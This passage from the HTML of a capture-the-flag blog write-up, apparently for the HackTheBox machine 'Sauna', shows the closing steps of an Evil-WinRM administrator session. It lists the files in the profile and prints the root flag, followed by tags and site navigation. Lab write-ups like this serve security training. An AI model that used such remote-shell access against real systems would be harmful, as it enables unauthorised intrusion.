</span><span class="n">Info</span><span class="p">:</span><span class="w"> </span><span class="n">Establishing</span><span class="w"> </span><span class="n">connection</span><span class="w"> </span><span class="n">to</span><span class="w"> </span><span class="n">remote</span><span class="w"> </span><span class="n">endpoint</span><span class="w">
</span><span class="o">*</span><span class="n">Evil</span><span class="nt">-WinRM</span><span class="o">*</span><span class="w"> </span><span class="n">PS</span><span class="w"> </span><span class="n">C:\Users\Administrator\Documents</span><span class="err">&gt;</span><span class="w"> </span><span class="nx">whoami</span><span class="w">
</span><span class="n">egotisticalbank\administrator</span><span class="w">
</span><span class="o">*</span><span class="nx">Evil-WinRM</span><span class="o">*</span><span class="w"> </span><span class="nx">PS</span><span class="w"> </span><span class="nx">C:\Users\Administrator\Documents</span><span class="err">&gt;</span><span class="w"> </span><span class="nx">cd</span><span class="w"> </span><span class="o">..</span><span class="w">
</span><span class="o">*</span><span class="n">Evil</span><span class="nt">-WinRM</span><span class="o">*</span><span class="w"> </span><span class="n">PS</span><span class="w"> </span><span class="n">C:\Users\Administrator</span><span class="err">&gt;</span><span class="w"> </span><span class="nx">tree</span><span class="w"> </span><span class="nx">/f</span><span class="w"> </span><span class="nx">/a</span><span class="w">
</span><span class="n">Folder</span><span class="w"> </span><span class="n">PATH</span><span class="w"> </span><span class="n">listing</span><span class="w">
</span><span class="n">Volume</span><span class="w"> </span><span class="n">serial</span><span class="w"> </span><span class="n">number</span><span class="w"> </span><span class="n">is</span><span class="w"> </span><span class="mi">489</span><span class="n">C-D8FC</span><span class="w">
</span><span class="nx">C:.</span><span class="w">
</span><span class="o">+-</span><span class="nt">--3D</span><span class="w"> </span><span class="n">Objects</span><span class="w">
</span><span class="o">+-</span><span class="nt">--Contacts</span><span class="w">
</span><span class="o">+-</span><span class="nt">--Desktop</span><span class="w">
</span><span class="o">|</span><span class="w">       </span><span class="n">root.txt</span><span class="w">
</span><span class="o">|</span><span class="w">
</span><span class="o">+-</span><span class="nt">--Documents</span><span class="w">
</span><span class="o">+-</span><span class="nt">--Downloads</span><span class="w">
</span><span class="o">|</span><span class="w">       </span><span class="n">z75198L13.exe</span><span class="w">
</span><span class="o">|</span><span class="w">
</span><span class="o">+-</span><span class="nt">--Favorites</span><span class="w">
</span><span class="o">|</span><span class="w">   </span><span class="o">|</span><span class="w">   </span><span class="n">Bing.url</span><span class="w">
</span><span class="o">|</span><span class="w">   </span><span class="o">|</span><span class="w">
</span><span class="o">|</span><span class="w">   </span><span class="n">\---Links</span><span class="w">
</span><span class="o">+-</span><span class="nt">--Links</span><span class="w">
</span><span class="o">|</span><span class="w">       </span><span class="n">Desktop.lnk</span><span class="w">
</span><span class="o">|</span><span class="w">       </span><span class="n">Downloads.lnk</span><span class="w">
</span><span class="o">|</span><span class="w">
</span><span class="o">+-</span><span class="nt">--Music</span><span class="w">
</span><span class="o">+-</span><span class="nt">--Pictures</span><span class="w">
</span><span class="o">+-</span><span class="nt">--Saved</span><span class="w"> </span><span class="n">Games</span><span class="w">
</span><span class="o">+-</span><span class="nt">--Searches</span><span class="w">
</span><span class="n">\---Videos</span><span class="w">
</span><span class="o">*</span><span class="nx">Evil-WinRM</span><span class="o">*</span><span class="w"> </span><span class="nx">PS</span><span class="w"> </span><span class="nx">C:\Users\Administrator</span><span class="err">&gt;</span><span class="w"> </span><span class="nx">type</span><span class="w"> </span><span class="nx">Desktop\root.txt</span><span class="w">
</span><span class="mi">8</span><span class="n">bcb632853e2f6cf8b3f5411fdb0ff65</span><span class="w">
</span><span class="o">*</span><span class="n">Evil</span><span class="nt">-WinRM</span><span class="o">*</span><span class="w"> </span><span class="n">PS</span><span class="w"> </span><span class="n">C:\Users\Administrator</span><span class="err">&gt;</span><span class="w">
</span></pre></table></code></div></div><p>I am Administrator Now !!</p><blockquote class="prompt-tip"><p>If you have any questions or suggestions, please leave a comment below. Thank You !</p></blockquote></div><div class="post-tail-wrapper text-muted"><div class="post-meta mb-3"> <i class="far fa-folder-open fa-fw me-1"></i> <a href="/categories/hackthebox/">HackTheBox</a></div><div class="post-tags"> <i class="fa fa-tags fa-fw me-1"></i> <a href="/tags/active-directory/" class="post-tag no-text-decoration" >Active Directory</a> <a href="/tags/bloodhound/" class="post-tag no-text-decoration" >BloodHound</a> <a href="/tags/dcsync/" class="post-tag no-text-decoration" >DCSync</a> <a href="/tags/privesc/" class="post-tag no-text-decoration" >PrivEsc</a> <a href="/tags/kerbrute/" class="post-tag no-text-decoration" >kerbrute</a> <a href="/tags/ldapsearch/" class="post-tag no-text-decoration" >ldapsearch</a></div><div class=" post-tail-bottom d-flex justify-content-between align-items-center mt-5 pb-2 " ><div class="license-wrapper"> This post is licensed under <a href="https://creativecommons.org/licenses/by/4.0/"> CC BY 4.0 </a> by the author.</div><div class="share-wrapper d-flex align-items-center"> <span class="share-label text-muted">Share</span> <span class="share-icons"> <a href="https://twitter.com/intent/tweet?text=Sauna%20-%20StrongShiv8&url=https%3A%2F%2Fstrongshiv8.github.io%2Fposts%2FSauna%2F" target="_blank" rel="noopener" data-bs-toggle="tooltip" data-bs-placement="top" title="Twitter" aria-label="Twitter"> <i class="fa-fw fa-brands fa-square-x-twitter"></i> </a> <a href="https://www.facebook.com/sharer/sharer.php?title=Sauna%20-%20StrongShiv8&u=https%3A%2F%2Fstrongshiv8.github.io%2Fposts%2FSauna%2F" target="_blank" rel="noopener" data-bs-toggle="tooltip" data-bs-placement="top" title="Facebook" aria-label="Facebook"> <i class="fa-fw fab fa-facebook-square"></i> </a> <a href="https://t.me/share/url?url=https%3A%2F%2Fstrongshiv8.github.io%2Fposts%2FSauna%2F&text=Sauna%20-%20StrongShiv8" target="_blank" rel="noopener" data-bs-toggle="tooltip" data-bs-placement="top" title="Telegram" aria-label="Telegram"> <i class="fa-fw fab fa-telegram"></i> </a> <a href="https://www.linkedin.com/feed/?shareActive=true&shareUrl=https%3A%2F%2Fstrongshiv8.github.io%2Fposts%2FSauna%2F" target="_blank" rel="noopener" data-bs-toggle="tooltip" data-bs-placement="top" title="Linkedin" aria-label="Linkedin"> <i class="fa-fw fab fa-linkedin"></i> </a> <button id="copy-link" aria-label="Copy link" class="btn small" data-bs-toggle="tooltip" data-bs-placement="top" title="Copy link" data-title-succeed="Link copied successfully!" > <i class="fa-fw fas fa-link pe-none fs-6"></i> </button> </span></div></div></div></article></main><aside aria-label="Panel" id="panel-wrapper" class="col-xl-3 ps-2 text-muted"><div class="access"><section id="access-lastmod"><h2 class="panel-heading">Recently Updated</h2><ul class="content list-unstyled ps-0 pb-1 ms-1 mt-2"><li class="text-truncate lh-lg"> <a href="/posts/Billing/">Billing</a><li class="text-truncate lh-lg"> <a href="/posts/Boxing/">Boxing</a><li class="text-truncate lh-lg"> <a href="/posts/Insomnia/">Insomnia</a><li class="text-truncate lh-lg"> <a href="/posts/Sea/">Sea</a><li class="text-truncate lh-lg"> <a href="/posts/Talk/">Talk</a></ul><div> <script src="https://tryhackme.com/badge/164383"></script></div><br><div> <a href="https://app.hackthebox.com/profile/595651"> <script src="https://www.hackthebox.eu/badge/595651"></script> </a></div></section><section><h2 class="panel-heading">Trending Tags</h2><div class="d-flex flex-wrap mt-3 mb-1 me-3"> <a class="post-tag btn btn-outline-primary" href="/tags/privesc/">PrivEsc</a> <a class="post-tag btn btn-outline-primary" href="/tags/public-exploit/">Public Exploit</a> <a class="post-tag btn btn-outline-primary" href="/tags/suids/">SUIDs</a> <a class="post-tag btn btn-outline-primary" href="/tags/cms/">CMS</a> <a class="post-tag btn btn-outline-primary" href="/tags/windows/">Windows</a> <a class="post-tag btn btn-outline-primary" href="/tags/password-bruteforce/">Password Bruteforce</a> <a class="post-tag btn btn-outline-primary" href="/tags/active-directory/">Active Directory</a> <a class="post-tag btn btn-outline-primary" href="/tags/lfi/">LFI</a> <a class="post-tag btn btn-outline-primary" href="/tags/wordpress/">Wordpress</a> <a class="post-tag btn btn-outline-primary" href="/tags/recon/">Recon</a></div></section></div><div class="toc-border-cover z-3"></div><section id="toc-wrapper" class="invisible position-sticky ps-0 pe-4 pb-4"><h2 class="panel-heading ps-3 pb-2 mb-0">Contents</h2><nav id="toc"></nav></section></aside></div><div class="row"><div id="tail-wrapper" class="col-12 col-lg-11 col-xl-9 px-md-4"><aside id="related-posts" aria-labelledby="related-label"><h3 class="mb-4" id="related-label">Further Reading</h3><nav class="row row-cols-1 row-cols-md-2 row-cols-xl-3 g-4 mb-4"><article class="col"> <a href="/posts/DOOMOPS/" class="post-preview card h-100"><div class="card-body"> <time data-ts="1697221800" data-df="ll" > Oct 14, 2023 </time><h4 class="pt-0 my-2">DoomOps</h4><div class="text-muted"><p>PwnTillDawn Machine ‚û°Ô∏è ¬†¬†Easy ¬†¬†¬†¬†¬†¬†¬†¬†¬†¬†¬†¬†¬†¬†¬†¬†¬†¬†¬†¬†¬†¬†¬†¬†¬† #Active Directory¬†¬†#BloodHound¬†¬†#CrackMapExec¬†¬†#GetNPUsers.py¬†¬†#LDAP¬†¬†#Mimikatz¬†¬†#SMB¬†¬†#ldapsearch¬†¬†¬†¬†¬†¬†¬†¬†¬†¬†¬†¬†¬†¬†¬†¬†¬†¬†¬† Port Scan Results ‚§µÔ∏è ...</p></div></div></a></article><article class="col"> <a href="/posts/VulnNet-Active/" class="post-preview card h-100"><div class="card-body"> <time data-ts="1696876200" data-df="ll" > Oct 10, 2023 </time><h4 class="pt-0 my-2">VulnNet Active</h4><div class="text-muted"><p>Port Scan Results ‚§µÔ∏è ‚îå‚îÄ‚îÄ(kali„âøkali)-[~/Downloads/Tryhackme/VulnNet] ‚îî‚îÄ$ sudo nmap -sC -sV -p- -T4 -oN Nmap_results.txt 10.10.75.19 [sudo] password for kali: Starting Nmap 7.94 ( https://nmap.or...</p></div></div></a></article><article class="col"> <a href="/posts/Resourced/" class="post-preview card h-100"><div class="card-body"> <time data-ts="1725301800" data-df="ll" > Sep 3, 2024 </time><h4 class="pt-0 my-2">Resourced</h4><div class="text-muted"><p>Proving Ground Practice Medium Level AD Machine ! you gona learn about GenericAll ACL permissions.</p></div></div></a></article></nav></aside><nav class="post-navigation d-flex justify-content-between" aria-label="Post Navigation"> <a href="/posts/Return/" class="btn btn-outline-primary" aria-label="Older" ><p>Return</p></a> <a href="/posts/SecNotes/" class="btn btn-outline-primary" aria-label="Newer" ><p>SecNotes</p></a></nav><footer aria-label="Site Info" class=" d-flex flex-column justify-content-center text-muted flex-lg-row justify-content-lg-between align-items-lg-center pb-lg-3 " ><p>¬© <time>2025</time> <a href="https://twitter.com/StrongShiv8">Shivendra Prajapati</a>. <span data-bs-toggle="tooltip" data-bs-placement="top" title="Except where otherwise noted, the blog posts on this site are licensed under the Creative Commons Attribution 4.0 International (CC BY 4.0) License by the author." >Some rights reserved.</span></p><p>Using the <a data-bs-toggle="tooltip" data-bs-placement="top" title="v7.3.0" href="https://github.com/cotes2020/jekyll-theme-chirpy" target="_blank" rel="noopener" >Chirpy</a> theme for <a href="https://jekyllrb.com" target="_blank" rel="noopener">Jekyll</a>.</p></footer></div></div><div id="search-result-wrapper" class="d-flex justify-content-center d-none"><div class="col-11 content"><div id="search-hints"><section><h2 class="panel-heading">Trending Tags</h2><div class="d-flex flex-wrap mt-3 mb-1 me-3"> <a class="post-tag btn btn-outline-primary" href="/tags/privesc/">PrivEsc</a> <a class="post-tag btn btn-outline-primary" href="/tags/public-exploit/">Public Exploit</a> <a class="post-tag btn btn-outline-primary" href="/tags/suids/">SUIDs</a> <a class="post-tag btn btn-outline-primary" href="/tags/cms/">CMS</a> <a class="post-tag btn btn-outline-primary" href="/tags/windows/">Windows</a> <a class="post-tag btn btn-outline-primary" href="/tags/password-bruteforce/">Password Bruteforce</a> <a class="post-tag btn btn-outline-primary" href="/tags/active-directory/">Active Directory</a> <a class="post-tag btn btn-outline-primary" href="/tags/lfi/">LFI</a> <a class="post-tag btn btn-outline-primary" href="/tags/wordpress/">Wordpress</a> <a class="post-tag btn btn-outline-primary" href="/tags/recon/">Recon</a></div></section></div><div id="search-results" class="d-flex flex-wrap justify-content-center text-muted mt-3"></div></div></div></div><aside aria-label="Scroll to Top"> <button id="back-to-top" type="button" class="btn btn-lg btn-box-shadow"> <i class="fas fa-angle-up"></i> </button></aside></div><div id="mask" class="d-none position-fixed w-100 h-100 z-1"></div><aside id="notification" class="toast" role="alert" aria-live="assertive" aria-atomic="true" data-bs-animation="true" data-bs-autohide="false" ><div class="toast-header"> <button type="button" class="btn-close ms-auto" data-bs-dismiss="toast" aria-label="Close" ></button></div><div class="toast-body text-center pt-0"><p class="px-2 mb-3">A new version of content is available.</p><button type="button" class="btn btn-primary" aria-label="Update"> Update </button></div></aside><script> (function () { const themeMapper = Theme.getThemeMapper('light', 'dark_dimmed'); const initTheme = themeMapper[Theme.visualState]; let lang = 'en';if (lang.length > 2 && !lang.startsWith('zh')) { lang = lang.slice(0, 2); } let giscusAttributes = { src: 'https://giscus.app/client.js', 'data-repo': 'StrongShiv8/strongshiv8.github.io', 'data-repo-id': 'R_kgDOJuXAnw', 'data-category': 'Comments', 'data-category-id': 'DIC_kwDOJuXAn84CeVpt', 'data-mapping': 'pathname', 'data-strict' : '0', 'data-reactions-enabled': '1', 'data-emit-metadata': '0', 'data-theme': initTheme, 'data-input-position': 'bottom', 'data-lang': lang, 'data-loading': 'lazy', crossorigin: 'anonymous', async: '' }; let giscusNode = document.createElement('script'); Object.entries(giscusAttributes).forEach(([key, value]) => giscusNode.setAttribute(key, value) ); const $footer = document.querySelector('footer'); $footer.insertAdjacentElement("beforebegin", giscusNode); addEventListener('message', (event) => { if (event.source === window && event.data && event.data.id === Theme.ID) { const newTheme = themeMapper[Theme.visualState]; const message = { setConfig: { theme: newTheme } }; const giscus = document.getElementsByClassName('giscus-frame')[0].contentWindow; giscus.postMessage({ giscus: message }, 'https://giscus.app'); } }); })(); </script> <script> document.addEventListener('DOMContentLoaded', () => { SimpleJekyllSearch({ searchInput: document.getElementById('search-input'), resultsContainer: document.getElementById('search-results'), json: '/assets/js/data/search.json', searchResultTemplate: '<article class="px-1 px-sm-2 px-lg-4 px-xl-0"><header><h2><a href="{url}">{title}</a></h2><div class="post-meta d-flex flex-column flex-sm-row text-muted mt-1 mb-1"> {categories} {tags}</div></header><p>{snippet}</p></article>', noResultsText: '<p class="mt-5">Oops! No results found.</p>', templateMiddleware: function(prop, value, template) { if (prop === 'categories') { if (value === '') { return `${value}`; } else { return `<div class="me-sm-4"><i class="far fa-folder fa-fw"></i>${value}</div>`; } } if (prop === 'tags') { if (value === '') { return `${value}`; } else { return `<div><i class="fa fa-tag fa-fw"></i>${value}</div>`; } } } }); }); </script>
